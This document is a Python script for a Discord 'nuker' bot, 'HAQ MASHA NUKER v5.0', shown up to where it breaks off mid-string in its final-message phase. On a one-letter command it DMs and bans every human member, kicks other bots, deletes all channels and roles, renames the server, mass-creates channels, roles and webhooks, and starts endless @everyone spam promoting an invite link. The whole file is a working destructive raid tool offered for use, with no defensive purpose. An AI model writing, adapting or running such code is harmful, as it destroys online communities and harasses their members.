import discord
from discord.ext import commands
import asyncio
import os
import random
import time
import aiohttp

os.system('cls' if os.name == 'nt' else 'clear')

print("""
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║              ██╗  ██╗ █████╗  ██████╗                                ║
║              ██║  ██║██╔══██╗██╔═══██╗                               ║
║              ███████║███████║██║   ██║                               ║
║              ██╔══██║██╔══██║██║▄▄ ██║                               ║
║              ██║  ██║██║  ██║╚██████╔╝                               ║
║              ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝                                ║
║                                                                       ║
║                    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗        ║
║                    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗       ║
║                    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝       ║
║                    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗       ║
║                    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║       ║
║                    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝       ║
║                                                                       ║
║                         HAQ MASHA NUKER v5.0                          ║
║                           MAXIMUM DESTRUCTION                         ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝
""")

token = input("[?] ENTER BOT TOKEN > ")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# HAQ MASHA KICK/BAN MESSAGE
HAQ_MESSAGE = """
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║                          ██╗  ██╗ █████╗  ██████╗                     ║
║                          ██║  ██║██╔══██╗██╔═══██╗                    ║
║                          ███████║███████║██║   ██║                    ║
║                          ██╔══██║██╔══██║██║▄▄ ██║                    ║
║                          ██║  ██║██║  ██║╚██████╔╝                    ║
║                          ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝                     ║
║                                                                       ║
║                          ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗   ║
║                          ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗  ║
║                          ██╔████╔██║███████║███████╗███████║███████║  ║
║                          ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║  ║
║                          ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║  ║
║                          ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝  ║
║                                                                       ║
║                                                                       ║
║                    YOU HAVE BEEN TERMINATED BY                        ║
║                         HAQ MASHA TEAM                                ║
║                                                                       ║
║                    https://discord.gg/c7cgYk4V                        ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝
"""

# SPAM MESSAGES
SPAM_LIST = [
    "@everyone **HAQ MASHA TEAM DESTROYED THIS SERVER**",
    "```HAQ MASHA NUKER ACTIVE```",
    "@everyone **https://discord.gg/c7cgYk4V**",
    "```SERVER = DELETED```",
    "**HAQ MASHA SAYS: GAME OVER**",
    "@everyone **YOUR SERVER IS GONE FOREVER**",
    "```THANKS FOR PLAYING```",
    "**HAQ MASHA TEAM - MAXIMUM DESTRUCTION**"
]

# ROLE NAMES
ROLE_NAMES = ["HAQ", "MASHA", "NUKE", "DESTROYER", "DELETED", "GONE", "REKT", "OWNER", "ADMIN", "HAQ-MASHA"]

# WEBHOOK SPAM NAMES
WEBHOOK_NAMES = ["HAQ-MASHA", "NUKER", "DESTROYER", "SYSTEM", "ADMIN", "HACKER"]

@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║              ✓ BOT ONLINE: {bot.user.name}
║              ✓ BOT ID: {bot.user.id}
║              ✓ SERVERS: {len(bot.guilds)}
║                                                                       ║
║              TYPE 'v' OR 'b' IN ANY CHANNEL TO START                 ║
║              MAXIMUM DESTRUCTION MODE ACTIVATED                       ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝
    """)

@bot.command(name="v")
async def nuke_v(ctx):
    await maximum_nuke(ctx)

@bot.command(name="b")
async def nuke_b(ctx):
    await maximum_nuke(ctx)

async def maximum_nuke(ctx):
    guild = ctx.guild
    start_time = time.time()
    
    # Send initial message
    await ctx.send("```🔥 HAQ MASHA MAXIMUM NUKE INITIATED 🔥```")
    
    print(f"\n[!] HAQ MASHA NUKE STARTED ON: {guild.name} | ID: {guild.id}")
    
    # ============================================
    # PHASE 1: BAN ALL MEMBERS FIRST (PRIORITY)
    # ============================================
    await ctx.send("**🔨 PHASE 1: BANNING ALL MEMBERS (PRIORITY MODE)**")
    
    members = await guild.fetch_members(limit=None).flatten()
    total_humans = len([m for m in members if not m.bot])
    banned = 0
    
    for member in members:
        if not member.bot:
            try:
                # Send HAQ MASHA message first
                try:
                    await member.send(HAQ_MESSAGE)
                except:
                    pass
                
                # BAN (not kick - BAN is stronger)
                await member.ban(reason="HAQ MASHA TEAM", delete_message_days=7)
                banned += 1
                
                if banned % 5 == 0:
                    await ctx.send(f"**BANNED {banned}/{total_humans} MEMBERS**")
                
                await asyncio.sleep(0.05)  # Super fast
            except:
                pass
    
    await ctx.send(f"**✅ BANNED {banned} MEMBERS SUCCESSFULLY**")
    
    # ============================================
    # PHASE 2: KICK ALL BOTS
    # ============================================
    await ctx.send("**🤖 PHASE 2: REMOVING ALL BOTS**")
    
    bots_kicked = 0
    for member in members:
        if member.bot and member.id != bot.user.id:
            try:
                await member.kick(reason="HAQ MASHA")
                bots_kicked += 1
                await asyncio.sleep(0.05)
            except:
                pass
    
    await ctx.send(f"**✅ REMOVED {bots_kicked} BOTS**")
    
    # ============================================
    # PHASE 3: DELETE EVERY CHANNEL
    # ============================================
    await ctx.send("**🗑️ PHASE 3: DELETING ALL CHANNELS**")
    
    channels_deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete(reason="HAQ MASHA")
            channels_deleted += 1
            await asyncio.sleep(0.03)
        except:
            pass
    
    await ctx.send(f"**✅ DELETED {channels_deleted} CHANNELS**")
    
    # ============================================
    # PHASE 4: DELETE EVERY ROLE
    # ============================================
    await ctx.send("**🎭 PHASE 4: DELETING ALL ROLES**")
    
    roles_deleted = 0
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete(reason="HAQ MASHA")
                roles_deleted += 1
                await asyncio.sleep(0.03)
            except:
                pass
    
    await ctx.send(f"**✅ DELETED {roles_deleted} ROLES**")
    
    # ============================================
    # PHASE 5: CHANGE GUILD NAME
    # ============================================
    new_name = random.choice(["HAQ-MASHA", "NUKE", "DESTROYED", "DELETED", "h4q", "m4sh4"])
    try:
        await guild.edit(name=new_name)
        await ctx.send(f"**✅ SERVER RENAMED TO: {new_name}**")
    except:
        pass
    
    # ============================================
    # PHASE 6: CREATE MASS CHANNELS (150+)
    # ============================================
    await ctx.send("**📁 PHASE 6: CREATING 150 CHANNELS**")
    
    for i in range(150):
        try:
            await guild.create_text_channel(name=f"haq-masha-{i}")
            if i % 25 == 0:
                await ctx.send(f"**CREATED {i} CHANNELS...**")
            await asyncio.sleep(0.02)
        except:
            pass
    
    # ============================================
    # PHASE 7: CREATE WEBHOOKS FOR EXTRA SPAM
    # ============================================
    await ctx.send("**🪝 PHASE 7: CREATING WEBHOOKS**")
    
    webhooks = []
    for channel in guild.text_channels:
        try:
            webhook = await channel.create_webhook(name=random.choice(WEBHOOK_NAMES))
            webhooks.append(webhook)
            await asyncio.sleep(0.05)
        except:
            pass
    
    # ============================================
    # PHASE 8: ROLE SPAM
    # ============================================
    await ctx.send("**🎭 PHASE 8: CREATING 50 ROLES**")
    
    for i in range(50):
        try:
            await guild.create_role(name=f"{random.choice(ROLE_NAMES)}-{i}", color=discord.Color.red())
            await asyncio.sleep(0.02)
        except:
            pass
    
    # ============================================
    # PHASE 9: INFINITE SPAM (CHANNELS + WEBHOOKS)
    # ============================================
    await ctx.send("**💬 PHASE 9: STARTING INFINITE SPAM**")
    
    async def channel_spam():
        while True:
            for channel in guild.text_channels:
                try:
                    await channel.send(random.choice(SPAM_LIST))
                    await asyncio.sleep(0.05)
                except:
                    pass
            await asyncio.sleep(0.3)
    
    async def webhook_spam():
        while True:
            for webhook in webhooks:
                try:
                    await webhook.send(random.choice(SPAM_LIST), username=random.choice(WEBHOOK_NAMES))
                    await asyncio.sleep(0.05)
                except:
                    pass
            await asyncio.sleep(0.3)
    
    asyncio.create_task(channel_spam())
    asyncio.create_task(webhook_spam())
    
    # ============================================
    # PHASE 10: FINAL MESSAGE & STATS
    # ============================================
    end_time = time.time()
    total_time = round(end_time - start_time, 2)
    
    final_message = f"""
